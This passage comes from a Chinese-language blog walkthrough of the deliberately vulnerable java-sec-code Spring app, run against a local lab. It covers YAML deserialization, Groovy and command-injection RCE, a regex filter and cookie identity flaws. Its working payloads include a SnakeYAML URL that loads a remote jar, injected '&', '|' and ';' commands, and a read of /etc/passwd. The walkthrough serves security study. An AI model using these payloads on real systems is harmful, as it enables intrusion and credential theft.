class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmd);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927399.png" alt="20250722150342733"></p><p>放入C盘</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927712.png" alt="20250722150411441"></p><p>用Python自带的简易HTTP服务器快速启动</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> C:\malicious<br>python -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927851.png" alt="20250722150542190"></p><p>现在本地就有了一个HTTP服务器，远程JS脚本的URL就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8000/zz.js<br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/rce/</span>jscmd?jsurl=http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8000</span>/zz.js<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927894.png" alt="20250722150709404"></p><p>HTTP访问日志：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928094.png" alt="20250722150740046"></p><h4 id="4-vuln-yarm"><a href="#4-vuln-yarm" class="headerlink" title="4.&#x2F;vuln&#x2F;yarm"></a>4.&#x2F;vuln&#x2F;yarm</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-comment">//使用默认构造方法创建一个 SnakeYAML 的解析器。这个构造器会使用默认的 Constructor，允许加载 Java 对象，存在安全风险。</span><br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-comment">//这里把传入的 content 作为 YAML 输入进行解析，如果内容里构造了特殊的 Java 对象，就可能会被反序列化并执行代码，形成 RCE</span><br>    y.load(content);<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;/sec/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">secYarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeConstructor</span>());<br>    y.load(content);<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>YAML 反序列化漏洞</strong> ,利用 SnakeYAML 默认构造器（反序列化）+ JDK 类加载机制，达到远程代码执行（RCE） 的攻击。</p><p>攻击核心点在于：</p><blockquote><p><strong>构造 ScriptEngineManager 并传入一个远程 URLClassLoader，从而触发恶意类加载或脚本执行。</strong></p><p>SnakeYaml反序列化漏洞研究:<a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p></blockquote><p>这是源码中作者给出的一个poc</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22</span>]]]]<br><br></code></pre></td></tr></table></figure><p>yaml-payload.jar:<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>下载好后开始打包为 jar：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">javac <span class="hljs-attribute">src</span>/artsploit/AwesomeScriptEngineFactory<span class="hljs-selector-class">.java</span> <br><br>jar -cvf yaml-payload<span class="hljs-selector-class">.jar</span> -C <span class="hljs-attribute">src</span>/ .<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928242.png" alt="20250722153817282"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928271.png" alt="20250722153829103"></p><p>将打包好的文件  yaml-payload.jar 放入服务器文件夹，开启HTTP</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929506.png" alt="20250722154012661"></p><p>触发漏洞：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1:8081/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://localhost:8000/yaml-payload.jar%22</span>]]]]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928486.png" alt="20250722155011777"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929891.png" alt="20250722155022447"></p><h4 id="5-groovy"><a href="#5-groovy" class="headerlink" title="5.groovy"></a>5.groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;groovy&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">groovyshell</span><span class="hljs-params">(String content)</span> &#123;<br>       <span class="hljs-comment">//GroovyShell 是 Groovy 提供的脚本解释器，可以在 Java 程序中动态执行 Groovy 代码</span><br>       <span class="hljs-type">GroovyShell</span> <span class="hljs-variable">groovyShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>();<br>       <span class="hljs-comment">//将用户传入的脚本内容作为 Groovy 代码,立即执行</span><br>       groovyShell.evaluate(content);<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rce/groovy?<span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;calc&quot;</span>.execute()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929076.png" alt="20250722155651468"></p><h2 id="命令注入-Cmd-Inject"><a href="#命令注入-Cmd-Inject" class="headerlink" title="命令注入-Cmd Inject"></a>命令注入-Cmd Inject</h2><p>源码位置：src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</p><h3 id="1-codeinject"><a href="#1-codeinject" class="headerlink" title="1.&#x2F;codeinject"></a>1.&#x2F;codeinject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/codeinject&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInject</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<span class="hljs-comment">//GET 请求，接收 filepath 参数</span><br>        <span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<span class="hljs-comment">//启动 cmd ，/c 执行后关闭终端，dir filepath 列出指定路径下的文件和目录；此处直接拼接了用户输入，存在 RCE 漏洞。</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<span class="hljs-comment">//使用上面构建的命令数组创建进程</span><br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<span class="hljs-comment">//将标准错误流（stderr）合并到标准输出流（stdout），方便统一读取</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<span class="hljs-comment">//启动进程，执行命令</span><br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<span class="hljs-comment">//获取命令执行后的标准输出流</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProcessBuilder</span><span class="hljs-params">(String... command)</span> &#123;<br>        <span class="hljs-built_in">this</span>.command = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(command.length);<br>        <span class="hljs-keyword">for</span> (String arg : command)<br>            <span class="hljs-built_in">this</span>.command.add(arg);<br>    &#125;<br>    <br> <span class="hljs-keyword">public</span> ProcessBuilder <span class="hljs-title function_">redirectErrorStream</span><span class="hljs-params">(<span class="hljs-type">boolean</span> redirectErrorStream)</span> &#123;<br>        <span class="hljs-built_in">this</span>.redirectErrorStream = redirectErrorStream;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>calc.exe<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>ipconfig<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>whoami<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=%<span class="hljs-number">7</span>Cwhoami<br></code></pre></td></tr></table></figure><ul><li>注意将符号进行 url 编码<ul><li>&amp; - .%26 - 拼接cmd命令</li><li>| - %7C - 执行多条命令</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929661.png" alt="20250723130014199"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929041.png" alt="20250723130045224"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929093.png" alt="20250723130103166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930759.png" alt="20250723130116070"></p><p>Linux：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8080/codeinject?filepath=/tmp;<span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h3 id="2-codeinject-host"><a href="#2-codeinject-host" class="headerlink" title="2.&#x2F;codeinject&#x2F;host"></a>2.&#x2F;codeinject&#x2F;host</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/host&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectHost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;host&quot;</span>);<br>        logger.info(host);<br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;curl &quot;</span> + host&#125;;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>注入参数为http请求头中的host参数，将host参数修改为 <code>payload：localhost&amp;ipconfig</code>，执行命令</p><p>BUG: Codeinject的host部分由于pom.xml更新了tomcat 版本导致打不通:</p><p><a href="https://github.com/JoyChou93/java-sec-code/issues/78">https://github.com/JoyChou93/java-sec-code/issues/78</a></p><h3 id="3-codeinject-sec"><a href="#3-codeinject-sec" class="headerlink" title="3.&#x2F;codeinject&#x2F;sec"></a>3.&#x2F;codeinject&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectSec</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filterFilePath</span> <span class="hljs-operator">=</span> SecurityUtil.cmdFilter(filepath);<span class="hljs-comment">//调用了自定义的安全类</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == filterFilePath) &#123;<span class="hljs-comment">//如果 cmdFilter 方法返回 null ，进行拦截</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad boy. I got u.&quot;</span>;<br>    &#125;<br>    String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ls -la &quot;</span> + filterFilePath&#125;;<span class="hljs-comment">//Linux 下的 shell 命令</span><br>    <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>    builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>    <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityUtil</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">FILTER_PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(SecurityUtil.class);<br><br>...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">cmdFilter</span><span class="hljs-params">(String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!FILTER_PATTERN.matcher(input).matches()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> input;<br>    &#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</code>:</p><ul><li><p><code>^</code> 和 <code>$</code>：表示整个字符串必须从头到尾都符合中间的规则。</p></li><li><p><code>[a-zA-Z0-9_/\\.-]+</code>：</p><ul><li><p><code>a-zA-Z0-9</code>：大小写字母和数字</p></li><li><p><code>_</code>：允许下划线</p></li><li><p><code>/</code>：允许正斜杠（路径分隔符）</p></li><li><p><code>.</code>：允许点号（如隐藏文件、扩展名）</p></li><li><p><code>-</code>：允许减号</p></li></ul></li></ul><p>可以过滤的威胁：</p><ul><li><code>;</code>, <code>&amp;</code>, <code>|</code>, <code>$</code>, <code>\</code>（除路径分隔符）, <code>*</code>, 空格、换行、引号等</li></ul><h2 id="cookies越权"><a href="#cookies越权" class="headerlink" title="cookies越权"></a>cookies越权</h2><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cookies.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.CookieValue;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.joychou.util.WebUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cookie&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cookies</span> &#123;<br><br>    <span class="hljs-comment">//表示 Cookie 中用于表示用户昵称的键</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">NICK</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nick&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln01&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln01</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-comment">//调用 getCookieValueByName 方法获取 cookie 中的 nick 值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> WebUtils.getCookieValueByName(req, NICK); <span class="hljs-comment">// key code</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static String getCookieValueByName(HttpServletRequest request, String cookieName) &#123;</span><br><span class="hljs-comment">        Cookie cookie = org.springframework.web.util.WebUtils.getCookie(request, cookieName);</span><br><span class="hljs-comment">        return cookie == null ? null : cookie.getValue();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"> */</span><br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln02</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie[] cookie = req.getCookies();<br><br>        <span class="hljs-keyword">if</span> (cookie != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">//调用 getCookie 方法获取 cookie 中的 nick 值</span><br>            nick = getCookie(req, NICK).getValue();  <span class="hljs-comment">// key code</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static Cookie getCookie(HttpServletRequest request, String name) &#123;</span><br><span class="hljs-comment">        Assert.notNull(request, &quot;Request must not be null&quot;);</span><br><span class="hljs-comment">        Cookie[] cookies = request.getCookies();</span><br><span class="hljs-comment">        if (cookies != null) &#123;</span><br><span class="hljs-comment">            for(Cookie cookie : cookies) &#123;</span><br><span class="hljs-comment">                if (name.equals(cookie.getName())) &#123;</span><br><span class="hljs-comment">                    return cookie;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return null;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    */</span><br>    <br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln03&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln03</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//遍历所有 cookie ，找 name 为 nick</span><br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">// key code. Equals can also be equalsIgnoreCase.</span><br>                <span class="hljs-comment">//equals() 是大小写敏感</span><br>                <span class="hljs-keyword">if</span> (NICK.equals(cookie.getName())) &#123;<br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln04&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln04</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>                <span class="hljs-comment">//使用 equalsIgnoreCase()，支持不区分大小写匹配 Cookie 名称。</span><br>                <span class="hljs-keyword">if</span> (cookie.getName().equalsIgnoreCase(NICK)) &#123;  <span class="hljs-comment">// key code</span><br>                    nick = cookie.getValue();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln05&quot;)</span><br>    <span class="hljs-comment">//使用 Spring 注解 @CookieValue(&quot;nick&quot;) 自动注入名为 nick 的 cookie 值。</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln05</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln06&quot;)</span><br>    <span class="hljs-comment">//和 vuln05 仅语法不同，功能完全一样。</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln06</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;nick&quot;)</span> String nick)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    